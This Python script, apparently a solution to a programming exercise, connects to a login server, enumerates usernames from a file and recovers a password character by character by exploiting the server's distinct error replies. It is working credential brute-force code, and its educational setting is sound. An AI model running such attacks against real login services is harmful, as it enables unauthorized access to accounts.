# write your code here
import socket
import argparse
import string
import os
import json


debug = True
lettres = list(string.ascii_letters) + list(string.digits)


parser = argparse.ArgumentParser()
parser.add_argument("server", help="Le serveur sur lequel se connecter")
parser.add_argument("port", help="Le port sur lequel se connecter")
args = parser.parse_args()
address = (args.server, int(args.port))


fichier_login = os.path.join(os.path.dirname(__file__),"logins.txt")
with open(fichier_login, 'r', encoding='utf-8') as f:
    login_list = f.readlines()


def comm_w_server(connex, credential):
    connex.send(json.dumps(credential).encode('utf-8'))
    rep = connex.recv(1024).decode('utf-8')
    if debug:
        ecrit_log(f'Envoi : {credential}\n')
        ecrit_log(f'Réponse : {dict(json.loads(rep))}\n')
    return dict(json.loads(rep))


def test_pwd(connex, credential, lettres):
    credential['password'] = ''
    rep = {"result": "Wrong password!"}
    while rep['result'] == 'Wrong password!':
        for lettre in lettres:
            credential['password'] = credential['password'] + lettre
            rep = comm_w_server(connex, credential)
            if debug:
                ecrit_log(f'Envoi : {credential}\n')
                ecrit_log(f'Réponse : {rep}\n')
            if rep['result'] == 'Wrong password!':
                credential['password'] = credential['password'][:-1]
                continue
            elif rep['result'] == 'Exception happened during login':
                continue
            elif rep['result'] == 'Connection success!':
                return json.dumps(credential)
        continue


def ecrit_log(chaine):
    with open(os.path.join(os.path.dirname(__file__), "envoi.txt"), "a+") as exp:
        exp.write(chaine)


with socket.socket() as connex:
    connex.connect(address)
    for login in login_list:
        credential = {"login": login.strip('\n'), "password": " "}
        reponse = comm_w_server(connex, credential)
        if debug:
            ecrit_log(f'Test : {reponse["result"] == "Wrong password!"}\n')
        if reponse['result'] == 'Wrong password!':
            cred = test_pwd(connex, credential, lettres)
            print(cred)
            exit()
